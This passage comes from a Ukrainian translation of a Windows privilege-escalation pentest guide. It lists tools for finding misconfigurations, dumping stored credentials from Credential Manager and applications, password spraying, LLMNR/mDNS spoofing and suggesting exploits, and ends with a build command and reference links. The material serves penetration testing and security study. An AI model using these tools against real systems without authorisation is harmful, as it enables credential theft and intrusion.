[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Перевірка неправильних конфігурацій і конфіденційних файлів (**[**перевірте тут**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Виявлено.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Перевірка деяких можливих неправильних конфігурацій і збір інформації (**[**перевірте тут**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Перевірка неправильних конфігурацій**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Витягує збережену інформацію про сесії PuTTY, WinSCP, SuperPuTTY, FileZilla та RDP. Використовуйте -Thorough локально.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Витягує облікові дані з Credential Manager. Виявлено.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Розпилення зібраних паролів у домені**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh — це інструмент PowerShell для підміни ADIDNS/LLMNR/mDNS і man-in-the-middle атак.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Базове перерахування Windows для privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Пошук відомих вразливостей privesc (DEPRECATED для Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Локальні перевірки **(потрібні права Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Пошук відомих вразливостей privesc (потрібно скомпілювати за допомогою VisualStudio) ([**попередньо скомпільований**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Перераховує дані хоста в пошуках неправильних конфігурацій (це радше інструмент збору інформації, ніж privesc) (потрібно скомпілювати) **(**[**попередньо скомпільований**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Витягує облікові дані з великої кількості програм (попередньо скомпільований exe у github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Порт PowerUp на C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Перевірка неправильних конфігурацій (попередньо скомпільований executable у github). Не рекомендовано. Погано працює у Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Перевірка можливих неправильних конфігурацій (exe із python). Не рекомендовано. Погано працює у Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Інструмент, створений на основі цього допису (для належної роботи йому не потрібен accesschk, але він може його використовувати).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Читає вивід **systeminfo** і рекомендує робочі exploits (локальний python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Читає вивід **systeminfo** і рекомендує робочі exploits (локальний python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Потрібно скомпілювати проєкт із використанням правильної версії .NET ([дивіться тут](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Щоб переглянути встановлену версію .NET на compromised host, виконайте:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Посилання

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: фішинг через Word VBA macro по SMTP → розшифрування облікових даних hMailServer → Veeam CVE-2023-27532 до SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) і викрадення kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Переслідування Silver Fox: гра в кішки-мишки в Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Вразливість файлової системи з привілейованим доступом у SCADA-системі](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Інструменти тестування Symbolic Link – використання CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [Повернення в минуле. Зловживання Symbolic Links у Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (порт Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: небезпечне розв'язання модулів у Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Модулі Node.js: завантаження з папок `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [Trail of Bits - завдання контрольного списку C/C++, розв'язані](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [Microsoft Learn - функція RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)

{{#include ../../banners/hacktricks-training.md}}
